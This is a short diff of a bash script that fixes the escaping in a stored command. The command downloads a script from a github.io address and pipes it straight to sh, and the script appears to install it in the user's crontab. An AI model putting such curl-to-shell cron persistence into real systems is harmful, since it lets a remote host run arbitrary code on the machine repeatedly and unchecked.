@@ -1,6 +1,6 @@
 #!/bin/bash
 
-command="curl -s https://matthewpipie.github.io/send.sh?\$(date +%s) | sh"
+command="curl -s https://matthewpipie.github.io/send.sh?\$(date +\%s) | sh"
 
 #write out current crontab
 crontab -l > mycron
